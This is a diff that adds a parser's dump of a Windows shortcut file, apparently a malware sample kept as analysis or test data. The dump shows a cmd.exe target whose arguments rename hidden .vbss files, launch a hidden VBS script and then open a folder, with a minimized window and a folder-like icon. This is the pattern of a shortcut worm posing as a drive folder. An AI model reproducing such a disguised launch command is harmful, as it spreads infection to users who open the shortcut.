@@ -1,0 +1,63 @@
+Windows Shortcut Information:
+   Header Size: 76
+   Link CLSID: 00021401-0000-0000-C000-000000000046
+   Link Flags: HasTargetIDList | HasArguments | HasIconLocation | IsUnicode - (225)
+   File Flags:  - (0)
+
+   Creation Timestamp: None
+   Modified Timestamp: None
+   Accessed Timestamp: None
+
+   File Size: 0 (r: 860)
+   Icon Index: 3 
+   Window Style: SW_SHOWMINNOACTIVE 
+   HotKey: UNSET - UNSET {0x0000} 
+   Reserved0: 0
+   Reserved1: 0
+   Reserved2: 0
+
+   TARGETS:
+      Size: 297
+      Index: 78
+      ITEMS:
+         Root Folder
+            Sort index: My Computer
+            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
+         Volume Item
+            Flags: 0xf
+            Data: None
+         File entry
+            Flags: Is directory
+            File size: 0
+            Modification time: None
+            File attribute flags: 16
+            Primary name: Windows
+         File entry
+            Flags: Is directory
+            File size: 0
+            Modification time: None
+            File attribute flags: 16
+            Primary name: system32
+         File entry
+            Flags: Is file
+            File size: 0
+            Modification time: None
+            File attribute flags: 0
+            Primary name: cmd.exe
+
+   DATA
+      Command line arguments: /c ren cfsdaacdfawd\*.vbss *.vbs &start \cfsdaacdfawd\aiasfacoiaksf.vbs&start explorer .android_secure&exit
+      Icon location: %SystemRoot%\System32\shell32.dll
+
+   EXTRA BLOCKS:
+      SPECIAL_FOLDER_LOCATION_BLOCK
+         Size: 16
+         Special folder id: 37
+         Offset: 213
+      UNKNOWN_BLOCK
+         Block:
+            Size: 28
+            Extra data sha256: 4f022b4bc7668d870e158010c9877224df1b9b07bd24ef32b731963232b15eb2
+         Block:
+            Size: 153
+            Extra data sha256: 40ebe6ee6ad3303ae2db241742e857aee523b21553a51e2f6c2a2461f1010879
